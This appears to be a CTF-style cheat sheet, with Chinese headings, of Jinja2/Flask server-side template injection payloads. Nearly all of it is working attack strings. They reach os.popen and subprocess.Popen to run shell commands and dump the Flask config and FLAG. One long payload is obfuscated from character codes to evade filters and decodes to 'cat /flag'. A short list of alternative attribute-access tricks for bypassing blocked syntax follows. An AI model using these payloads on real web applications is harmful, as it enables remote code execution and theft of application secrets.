- # 示例
- ```python
  {{().__class__.__mro__[-1].__subclasses__([127].__init__.__globals__['sys'].modules['os'].popen('cmd').read()}}
  
  {{[].__class__.__mro__[1].__subclasses__()[237]('ls',shell=True,stdout=-1).communicate()[0]}}
  
  {{url_for.__globals__['current_app'].config.FLAG}}
  
  {{self.__dict__._TemplateReference__context.config}}
  
  {{(lipsum()|urlencode|first~dict(c=1)|join())*3%(97,98,99)}}
                                            
  ```
- ```python
  self|attr((lipsum()|string|list|pprint|list|string|safe|urlencode|first~dict(c=1)|join())*9%(95,95,99,108,97,115,115,95,95))|attr((lipsum()|string|list|pprint|list|string|safe|urlencode|first~dict(c=1)|join())*7%(95,95,109,114,111,95,95))|last|attr((lipsum()|string|list|pprint|list|string|safe|urlencode|first~dict(c=1)|join())*14%(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr((lipsum()|string|list|pprint|list|string|safe|urlencode|first~dict(c=1)|join())*11%(95,95,103,101,116,105,116,101,109,95,95))(349)((lipsum()|string|list|pprint|list|string|safe|urlencode|first~dict(c=1)|join())*9%(99,97,116,32,47,102,108,97,103),shell=True,stdout=-1)|attr((lipsum()|string|list|pprint|list|string|safe|urlencode|first~dict(c=1)|join())*11%(99,111,109,109,117,110,105,99,97,116,101))()
  ```
- # 访问属性和物品
	- `request.__class__`
	- `request["__class__"]`
	- `request|attr("__class__")`
	- `array[0]`
	- `array.pop(0)`
	- `array.__getitem__(2)`
-